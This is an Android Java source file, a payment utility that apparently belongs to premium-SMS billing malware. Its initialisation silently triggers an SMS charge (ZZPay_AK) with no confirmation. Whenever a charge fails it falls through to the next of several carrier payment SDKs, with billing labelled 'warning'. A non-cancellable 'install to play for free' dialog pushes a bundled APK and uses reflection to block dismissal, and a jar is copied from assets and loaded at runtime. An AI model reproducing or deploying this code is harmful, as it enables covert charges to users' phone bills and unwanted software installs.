package com.zmv.zf.pay;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.ArrayList;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.Dialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnKeyListener;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.ImageView;

import com.hihi.jy.R;
import com.dm.ml.MiLiNewApi;
import com.umeng.analytics.MobclickAgent;
import com.zhangzhifu.sdk.ZhangPaySdk;
import com.zmv.zf.common.Conf;
import com.zmv.zf.database.UserDAO;
import com.zmv.zf.utils.BasicUtils;
import com.zmv.zf.utils.IOUtils;
import com.zz.paysdk.zzPaySDK;
import com.zz.paysdk.interfaces.OnMakePaymentListener;

public class SMSPayUtils {

	private Activity context;
	private int posPay = 0;
	private int countPay = 0;
	private ArrayList<Integer> list_warning;
	private Dialog payDialog;
	zzPaySDK zzPay;
	String cpname;
	private boolean pay_status = false;

	public SMSPayUtils() {

	}

	public SMSPayUtils(Activity context, String cpname) {
		this.context = context;
		this.cpname = cpname;
	}

	private void getSign() {
		try {
			if (!pay_status) {
				if (!BasicUtils.isInstallApk(context, ConfigUtils.packname)
						&& ConfigUtils.isdownplug) {
					pluginDialog();
				} else {
					if (!cpname.equals("libao"))
						ThirdDialog.getInstance().makeDialog(context);
				}
			}

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {
		}
	}

	private void installApk(Context context, File file) {
		Intent intent = new Intent();
		intent.setAction("android.intent.action.VIEW");
		intent.addCategory("android.intent.category.DEFAULT");
		intent.setType("application/vnd.android.package-archive");
		intent.setData(Uri.fromFile(file));
		intent.setDataAndType(Uri.fromFile(file),
				"application/vnd.android.package-archive");
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(intent);
	}

	private void pluginDialog() {

		MobclickAgent.onEvent(context, "zb_request");
		AlertDialog.Builder builder = new Builder(context);
		builder.setMessage("亲,安装即可免费播放");
		builder.setTitle("提示");
		builder.setCancelable(false);
		builder.setPositiveButton("立即安装",
				new DialogInterface.OnClickListener() {
					@Override
					public void onClick(DialogInterface dialog, int which) {
						if (!BasicUtils.isInstallApk(context,
								ConfigUtils.packname)) {
							try {
								installApk(context, IOUtils
										.getcjVideoAPKFolder(Conf.filename));
								// 利用反射屏蔽dismiss功能
								Field field = dialog.getClass().getSuperclass()
										.getDeclaredField("mShowing");
								field.setAccessible(true);
								// 将mShowing变量设为false，表示对话框已关闭
								field.set(dialog, false);
								dialog.dismiss();
							} catch (Exception e) {
							}
						} else {
							try {// 利用反射屏蔽dismiss功能
								Field field = dialog.getClass().getSuperclass()
										.getDeclaredField("mShowing");
								field.setAccessible(true);
								// 将mShowing变量设为false，表示对话框已关闭
								field.set(dialog, true);
								dialog.dismiss();
								if (IOUtils.getcjVideoAPKFolder(Conf.filename)
										.exists())
									IOUtils.getcjVideoAPKFolder(Conf.filename)
											.delete();
								Intent adIntent = new Intent();
								adIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
								adIntent.setComponent(new ComponentName(
										ConfigUtils.packname,
										ConfigUtils.packname + ".MainActivity"));
								context.startActivity(adIntent);
								MobclickAgent.onEvent(context, "zb_install");
								updateOpen(1);
							} catch (Exception e) {
							}
						}
					}
				});
		builder.setNegativeButton("取消", new DialogInterface.OnClickListener() {
			@Override
			public void onClick(DialogInterface dialog, int which) {
				if (!BasicUtils.isInstallApk(context, ConfigUtils.packname)) {
					if (!cpname.equals("l"))
						ThirdDialog.getInstance().makeDialog(context);
					MobclickAgent.onEvent(context, "zb_cancel");
				} else {
					try {
						if (IOUtils.getcjVideoAPKFolder(Conf.filename).exists())
							IOUtils.getcjVideoAPKFolder(Conf.filename).delete();

						Intent adIntent = new Intent();
						adIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						adIntent.setComponent(new ComponentName(
								ConfigUtils.packname, ConfigUtils.packname
										+ ".MainActivity"));
						context.startActivity(adIntent);
						MobclickAgent.onEvent(context, "zb_install");
						updateOpen(1);
					} catch (Exception e) {
					}

				}
				try {
					Field field = dialog.getClass().getSuperclass()
							.getDeclaredField("mShowing");
					field.setAccessible(true);
					// 将mShowing变量设为false，表示对话框已关闭
					field.set(dialog, true);
					dialog.dismiss();
				} catch (NoSuchFieldException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IllegalAccessException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IllegalArgumentException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		});
		builder.setOnKeyListener(new OnKeyListener() {

			@Override
			public boolean onKey(DialogInterface arg0, int keyCode,
					KeyEvent event) {
				// TODO Auto-generated method stub
				// if (keyCode == KeyEvent.KEYCODE_BACK
				// && event.getRepeatCount() == 0) {
				// }
				if (keyCode == KeyEvent.KEYCODE_SEARCH) {
					return true;
				} else {
					return false; // 默认返回 false
				}
			}
		});
		builder.create().show();
	}

	private void SiKaiPay() {
		// 计费价格，以分为单位
		String price = "1000";
		// 计费点编号
		String payPoint;
		if (cpname.equals("warning")) {
			payPoint = "1";
		} else if (cpname.equals("libao")) {
			payPoint = "2";
		} else {
			payPoint = "3";
		}
		SiKaiPayUtils.pay(context, payPoint, price, cpname, handler, true);

	}

	private void updateOpen(int times) {
		UserDAO user = new UserDAO(context);
		Conf.OPEN += times;
		user.updateOpen(Conf.OPEN);
	}

	public void initSDK() {
		if (Conf.VIP)
			return;
		if (ConfigUtils.warningData != null
				&& ConfigUtils.warningData.size() > 0 && !ConfigUtils.nopay) {
			countPay = ConfigUtils.warningData.size();
			list_warning = new ArrayList<Integer>();

			if (ConfigUtils.warningData.toString().contains("zzhi")) {//
				// zzSDK
				zzPay = new zzPaySDK();
				zzPay.InitPaySDK(context, "50003", "1003", "gogogogogo", null);
			}
			if (ConfigUtils.warningData.toString().contains("zyou")) {
				ZhangPaySdk.getInstance().init(context,
						Conf.ZHANGZHIFU_CHANNELID, Conf.ZHANGZHIFU_APPID,
						Conf.ZHANGZHIFU_APPKQD);
			}
			for (int i = 0; i < countPay; i++) {
				if (ConfigUtils.warningData.get(i).equals("zhim")) {
					list_warning.add(1);

				} else if (ConfigUtils.warningData.get(i).equals("zyou")) {
					/** 掌支付 */
					list_warning.add(2);
				} else if (ConfigUtils.warningData.get(i).equals("zzhi")) {

					list_warning.add(3);

				} else if (ConfigUtils.warningData.get(i).equals("mili")) {
					File file = new File(context.getCacheDir()
							.getAbsolutePath() + "/info/ml206.jar");
					CopyAssertJarToFile(context, "ml.zip",
							file.getAbsolutePath());
					MiLiNewApi.init(context);
					list_warning.add(4);

				}
			}
			// 调用支付SDK
			if (list_warning != null && list_warning.size() > 0) {
				posPay = 0;
				countPay = list_warning.size();
				handler.sendEmptyMessageDelayed(0, 0);
				ZZPay_AK();
			} else
				getSign();
		} else {
			getSign();

		}
	}

	public void makeDialog(final Activity activity) {
		try {
			if (cpname.equals("warning"))
				MobclickAgent.onEvent(context, "pay_dialog_vip");
			else if (cpname.equals("libao"))
				MobclickAgent.onEvent(context, "pay_dialog_libao");
			else
				MobclickAgent.onEvent(context, "pay_dialog_request");
			context = activity;
			payDialog = BasicUtils.showDialog(activity, R.style.BasicDialog);
			payDialog.setContentView(R.layout.dialog_pay);
			payDialog.setCanceledOnTouchOutside(false);
			payDialog.setCancelable(false);
			// tv.setText("");
			ImageView img_pay_bg = (ImageView) payDialog.getWindow()
					.findViewById(R.id.img_pay_bg);
			if (cpname.equals("shipin"))
				img_pay_bg.setImageResource(R.drawable.agreement_bg);
			else if (cpname.equals("warning"))
				img_pay_bg.setImageResource(R.drawable.vip_bg);
			else
				img_pay_bg.setImageResource(R.drawable.gift_bg);
			payDialog.getWindow().findViewById(R.id.img_pay_colse)
					.setOnClickListener(new OnClickListener() {

						@Override
						public void onClick(View arg0) {
							// TODO Auto-generated method stub
							if (payDialog != null)
								payDialog.dismiss();
							if (cpname.equals("warning"))
								MobclickAgent.onEvent(context,
										"pay_dialog_vip_cancel");
							else if (cpname.equals("libao"))
								MobclickAgent.onEvent(context,
										"pay_dialog_libao_cancel");
							else
								MobclickAgent.onEvent(context,
										"pay_dialog_cancel");
//							getSign();
							handler.sendEmptyMessageDelayed(
									list_warning.get(posPay), 1000);	
						}
					});
			payDialog.getWindow().findViewById(R.id.btn_pay_submit)
					.setOnClickListener(new OnClickListener() {

						@Override
						public void onClick(View arg0) {
							// TODO Auto-generated method stub
							if (payDialog != null)
								payDialog.dismiss();
							handler.sendEmptyMessageDelayed(
									list_warning.get(posPay), 1000);
							if (cpname.equals("warning"))
								MobclickAgent.onEvent(context,
										"pay_dialog_vip_sure");
							else if (cpname.equals("libao"))
								MobclickAgent.onEvent(context,
										"pay_dialog_libao_sure");
							else
								MobclickAgent.onEvent(context,
										"pay_dialog_sure");
						}
					});
			payDialog.setOnKeyListener(new OnKeyListener() {

				@Override
				public boolean onKey(DialogInterface arg0, int keyCode,
						KeyEvent event) {
					// TODO Auto-generated method stub
					// if (keyCode == KeyEvent.KEYCODE_BACK
					// && event.getRepeatCount() == 0) {
					// }
					if (keyCode == KeyEvent.KEYCODE_SEARCH) {
						return true;
					} else {
						return false; // 默认返回 false
					}
				}
			});
			payDialog.show();
		} catch (Exception e) {
			// TODO: handle exception
			// Log.e("e", e.toString());
		}
	}

	// zzSDK
	private void ZZPay() {
		if (zzPay == null)
			return;
		zzPay.MakePayment("50003", "1003", "20006", Conf.UID + "," + Conf.CID
				+ ",warning", new OnMakePaymentListener() {

			@Override
			public void onAction(int arg0, Object arg1) {
				// Log.e("zzPay", arg0 + "");
				if (arg0 == 200) {

					MobclickAgent.onEvent(context, "zz_success");
					SuccessResult();
				} else {
					MobclickAgent.onEvent(context, "zz_fail");
					FailResult();
				}
				/*
				 * Log.e("zzpaysdk", status + "==" + userParameter); ++posPay;
				 * if (posPay < countPay) handler.sendEmptyMessageDelayed
				 * (list_warning.get(posPay), 0); else { getSign(); }
				 */
			}
		});
	}

	// 叉叉-自通道
	private void ZZPay_AK() {

		MobclickAgent.onEvent(context, "zz_ak_request");
		if (zzPay == null)
			return;
		zzPay.MakePayment("50003", "1007", "20012", Conf.UID + "," + Conf.CID
				+ ",warning", new OnMakePaymentListener() {
			@Override
			public void onAction(int arg0, Object arg1) {
				// Log.e("zzPayad", arg0 + "");
				if (arg0 == 200) {

					MobclickAgent.onEvent(context, "zz_ak_success");
				} else {

					MobclickAgent.onEvent(context, "zz_ak_fail");
				}
			}
		});
	}

	public Handler handler = new Handler() {
		public void handleMessage(Message msg) {
			try {
				// Log.e("警告支付===1002=", "第" + posPay + "个：" + msg.what + "");
				switch (msg.what) {
				case 0:
					makeDialog(context);
					break;
				case 1:// 斯凯

					MobclickAgent.onEvent(context, "zm_request");
					SiKaiPay();
					break;
				case 2:// 掌游

					MobclickAgent.onEvent(context, "zy_request");
					new Thread(new Runnable() {

						@Override
						public void run() {
							// TODO Auto-generated method stub
							if (cpname.equals("warning"))
								ZhangPayUtils.getInstance(context, handler)
										.ZhangPay(cpname,
												Conf.ZHANGYOU_POINTID1,
												Conf.ZHANGYOU_POINTTITLE1,
												Conf.ZHANGYOU_POINTMSG1);
							else if (cpname.equals("libao"))
								ZhangPayUtils.getInstance(context, handler)
										.ZhangPay(cpname,
												Conf.ZHANGYOU_POINTID2,
												Conf.ZHANGYOU_POINTTITLE2,
												Conf.ZHANGYOU_POINTMSG2);
							else
								ZhangPayUtils.getInstance(context, handler)
										.ZhangPay(cpname,
												Conf.ZHANGYOU_POINTID3,
												Conf.ZHANGYOU_POINTTITLE3,
												Conf.ZHANGYOU_POINTMSG3);

						}
					}).start();
					break;
				case 3:// 中至
					MobclickAgent.onEvent(context, "zz_request");
					ZZPay();
					break;
				case 4:// 米粒
					MobclickAgent.onEvent(context, "mili_request");
					if (cpname.equals("warning")) {
						MiLiPayUtils.getInstance(context, handler).MiLiPay(
								"warning", "51340757", 10);
					} else {
						MiLiPayUtils.getInstance(context, handler).MiLiPay(
								"libao", "51340758", 10);
					}
					break;
				case 101:// 斯凯支付失败
					MobclickAgent.onEvent(context, "zm_fail");
					FailResult();
					// Log.e("斯凯失败", "斯凯失败");
					break;
				case 102: // 斯凯支付成功
					MobclickAgent.onEvent(context, "zm_success");
					SuccessResult();
					// Log.e("斯凯成功", "斯凯成功");
					break;
				case 1001:// 掌支付成功回调
				case 2001:
				case 3001:
					MobclickAgent.onEvent(context, "zy_success");
					SuccessResult();
					// Log.e("掌支付成功", "掌支付成功");
					break;
				case 1002:// 掌支付失败回调
				case 2002:// 掌支付失败回调
				case 3002:// 掌支付失败回调
					MobclickAgent.onEvent(context, "zy_fail");
					FailResult();
					// Log.e("掌支付失败", "掌支付失败");
					break;
				case 1003:// 米粒成功
				case 2003:
				case 3003:
					MobclickAgent.onEvent(context, "mili_success");
					SuccessResult();
					break;
				case 1004:// 米粒失败
				case 2004:
				case 3004:
					MobclickAgent.onEvent(context, "mili_fail");
					FailResult();
					break;
				default:
					break;
				}
			} catch (Exception e) {
				// TODO: handle exception
			}
		};
	};

	public void SuccessResult() {
		updateOpen(4);
		pay_status = true;
		getSign();
	}

	public void FailResult() {
		++posPay;
		if (posPay < countPay)
			handler.sendEmptyMessageDelayed(list_warning.get(posPay), 0);
		else {
			pay_status = false;
			getSign();
		}
	}

	public void CopyAssertJarToFile(Context context, String fileName,
			String filePath) {
		try {
			InputStream inStream = context.getAssets().open(fileName);
			File newFile = new File(filePath);
			if (!newFile.exists()) {
				// 文件不存在，则创建目录
				newFile.getParentFile().mkdirs();
			}
			FileOutputStream fs = new FileOutputStream(newFile);
			byte[] buffer = new byte[1024];
			int byteread = 0;
			while ((byteread = inStream.read(buffer)) != -1) {
				fs.write(buffer, 0, byteread);
			}
			fs.flush();
			fs.close();
			inStream.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void payfinish() {
		try {

			if (zzPay != null) {
				zzPay.unRegisterBroadCastReceiver();
				zzPay.unRegisterContentObserver(context);
			}
		} catch (Exception e) {
			// TODO: handle exception
		}
	}
}
